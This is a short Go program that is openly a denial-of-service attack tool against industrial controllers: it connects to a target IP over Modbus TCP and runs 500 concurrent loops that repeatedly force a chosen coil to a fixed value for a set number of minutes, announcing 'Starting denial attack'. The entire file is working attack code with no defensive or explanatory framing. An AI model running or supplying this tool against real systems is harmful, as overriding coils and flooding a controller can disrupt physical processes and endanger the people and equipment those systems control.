package main

import (
	"flag"
	"fmt"
	"os"
	"sync"
	"time"

	"github.com/goburrow/modbus" //Import the necessary modbus library
)

var (
	ip_address string
	coil       int
	coil_val   int
	runtime    int
	wait       sync.WaitGroup
)

func init() {
	flag.StringVar(&ip_address, "ip_address", "192.168.13.86", "Enter IP address to target")
	flag.IntVar(&runtime, "runtime", 1, "How long the program will run")
	flag.IntVar(&coil, "coil", 0, "The coil position you are writing to")
	flag.IntVar(&coil_val, "coil_val", 0, "The value you are writing to the coil")
}

func jammer(target modbus.Client, coil uint16, coil_value int) {

	for {
		if coil_value == 1 {
			results, err := target.WriteSingleCoil(coil, 0xFF00) //Writes a one to coil at position 0. 0xFF00 for 1 and 0x0000 for 0
			if err != nil {
				fmt.Println(err)
				fmt.Println(results)
			}
		} else {
			results, err := target.WriteSingleCoil(coil, 0x0000)
			if err != nil {
				fmt.Println(err)
				fmt.Println(results)
			}
		}
	}
}

func main() {
	flag.Parse()
	target := ip_address + ":502"
	handler := modbus.NewTCPClientHandler(target)
	handler.Timeout = 10 * time.Second

	err := handler.Connect()
	if err != nil {
		fmt.Print(err)
	}

	defer handler.Close()

	client := modbus.NewClient(handler)

	for i := 0; i < 500; i++ { //Generate flood of connections
		wait.Add(1)
		go jammer(client, uint16(coil), coil_val)
	}

	fmt.Println("Starting denial attack...")
	//Runs the exploit for the specified duration
	timer2 := time.NewTimer(time.Duration(runtime) * time.Minute)
	go func() {
		<-timer2.C
		fmt.Println("Denial attack completed")
		os.Exit(0)
	}()

	wait.Wait()

}
